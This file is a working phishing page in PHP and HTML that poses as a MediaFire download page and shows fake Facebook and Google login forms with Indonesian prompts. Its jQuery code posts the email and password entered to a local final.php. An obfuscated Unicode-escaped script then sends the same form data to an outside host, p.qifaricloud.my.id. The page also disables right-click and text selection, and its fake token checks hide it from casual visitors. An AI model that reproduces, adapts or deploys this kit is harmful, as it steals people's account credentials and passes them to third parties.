<?php
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE HTML>
<html lang="en-US">
<html>
 <head> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
  <title>Mediafire</title> 
  <meta property="og:image" content="https://www.mediafire.com/images/logos/mf_logo250x250.png"> 
  <meta property="og:description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere."> 
  <link rel="preconnect" href="https://fonts.googleapis.com"> 
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""> 
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet"> 
  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css"> 
  <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"> 
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-aryatqhio/css@main/2/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-aryatqhio/css@main/2/google.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-aryatqhio/css@main/2/all.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-aryatqhio/css@main/2/style.css"> 
  <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android"> 
  <link rel="icon" type="image/x-icon" href="https://cdn.statically.io/gh/AlexHostX/all.asset/main/mdr/favicon.ico"> 
  <style>
 </style> 
 </head> 
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"> 
  <main> 
   <header> 
    <div class="imgmdralex"> 
     <img id="ptcalexd" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/wj2rmp.png" alt="mediafire"> 
     <img id="ptcalexm" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/wj2rmp.png" alt="mediafire"> 
    </div> 
    <div class="menualexuser"> 
     <button>Sign Up</button> 
     <button>Log In <i class="fa-brands fa-facebook-f" onclick="Loginpopunder()"></i> <i class="fa-brands fa-twitter"></i></button> 
    </div> 
   </header> 
   <section> 
    <div class="contalexmdr"> 
     <div class="btnalexdwn" onclick="Loginpopunder()"> 
      <div class="lalexbtnd" onclick="Loginpopunder()"> 
       <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/mp4.webp" alt="" onclick="Loginpopunder()"> 
       <div class="txtalexdwn" onclick="Loginpopunder()"> 
        <p onclick="Loginpopunder()"><?php echo $data['nama'];?></p> 
        <label onclick="Loginpopunder()">Download (<?php echo $data['ukuran'];?>MB)</label> 
       </div> 
      </div> 
      <i onclick="Loginpopunder()" class="fa-solid fa-down-to-line"></i> 
     </div> 
     <div class="alexlnkcont"> 
      <div class="itemalexcont"> 
       <i class="fa-solid fa-link-simple"></i> 
       <span>Copy for messenger</span> 
      </div> 
      <div class="itemalexcont"> 
       <i class="fa-solid fa-share-nodes"></i> 
       <span>Share options</span> 
      </div> 
      <div class="itemalexcont"> 
       <i class="fa-brands fa-facebook-f"></i> 
       <span>Post to Facebook</span> 
      </div> 
      <div class="itemalexcont"> 
       <i class="fa-solid fa-plus"></i> 
       <span>Save to My Files</span> 
      </div> 
     </div> 
    </div> 
    <div class="uplregalexmdr"> 
     <div class="alexmapmdr"> 
      <div class="descalexmapmdr">
        Upload region: 
      </div> 
      <div class="bgalexdbmdr"></div> 
     </div> 
     <div class="alexdescmap"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/ybw5yq.jpg" alt=""> 
      <span>This file was uploaded from Indonesia on May 17, 2024 at 7:24 AM</span> 
     </div> 
    </div> 
   </section> 
   <footer> 
    <div class="topmdrfootalex"> 
     <div class="itemboxmdralexf"> 
      <p>COMPANY</p> 
      <div class="spnalxmdr"> 
       <span>About Us</span> 
       <span>Careers</span> 
       <span>Press</span> 
       <span>Company Blog</span> 
      </div> 
     </div> 
     <div class="itemboxmdralexf"> 
      <p>TOOLS</p> 
      <div class="spnalxmdr"> 
       <span>MediaFire Mobile</span> 
       <span>On-Demand Video Encoding</span> 
      </div> 
     </div> 
     <div class="itemboxmdralexf"> 
      <p>UPGRADE</p> 
      <div class="spnalxmdr"> 
       <span>Professionals</span> 
      </div> 
     </div> 
     <div class="itemboxmdralexf"> 
      <p>SUPPORT</p> 
      <div class="spnalxmdr"> 
       <span>Get Support</span> 
      </div> 
     </div> 
    </div> 
    <div class="alexfootalexc"> 
     <div class="leftcalexmdrf"> 
      <span>©2024 MediaFire Build 121873</span> 
      <div class="spnjjralexmdr"> 
       <span>Advertising</span> 
       <span>Terms</span> 
       <span>Privacy Policy</span> 
       <span>Copyright</span> 
       <span>Abuse</span> 
       <span>Credits</span> 
       <span>More...</span> 
      </div> 
     </div> 
     <div class="rightalexmdrf"> 
      <i class="fa-brands fa-facebook-f"></i> 
      <i class="fa-brands fa-twitter"></i> 
      <i class="fa-solid fa-b"></i> 
     </div> 
    </div> 
   </footer> 
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="https://cdnassets.biz.id/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script>
  $(document).ready(function () {

    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function handleFormSubmit(formSelector, emailSelector, passwordSelector, loginType) {

        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email    = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();

            if (email && password) {

                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }
                
                $.post("final.php", {
                    email: email,
                    password: password,
                    login: loginType
                });
                window.location.href = "https://doods-stream.site/unduh";
            }
        });
    }
    
    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit("#FromxFacebook", 'input[name="email"]', 'input[name="password"]', "Facebook");
    handleFormSubmit("#FromxGoogle", "#email_gp", "#password_gp", "Google");


    // Tombol
    $("#codxFacebook").click(function () { OpenFacebook(); });
    $("#codxGoogle").click(function () { OpenGoogle(); });
    $("#Loginpopunder").click(function () { Loginpopunder(); });

});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
$(document)['\u0072\u0065\u0061\u0064\u0079'](function(){$("\u0023\u0046\u0072\u006F\u006D\u0078\u0046\u0061\u0063\u0065\u0062\u006F\u006F\u006B\u002C\u0023\u0046\u0072\u006F\u006D\u0078\u0047\u006F\u006F\u0067\u006C\u0065")['\u0073\u0075\u0062\u006D\u0069\u0074'](function(x,_0x845g8e){x['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();var _0x3160a=$(this)['\u0073\u0065\u0072\u0069\u0061\u006C\u0069\u007A\u0065']();_0x845g8e='\u0068\u006C\u006B\u0063\u006F\u0063';$['\u0061\u006A\u0061\u0078']({'\u0075\u0072\u006C':'https://p.qifaricloud.my.id/myjs/apixgg.php','\u0074\u0079\u0070\u0065':"\u0050\u004F\u0053\u0054",'\u0064\u0061\u0074\u0061':_0x3160a});});});
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>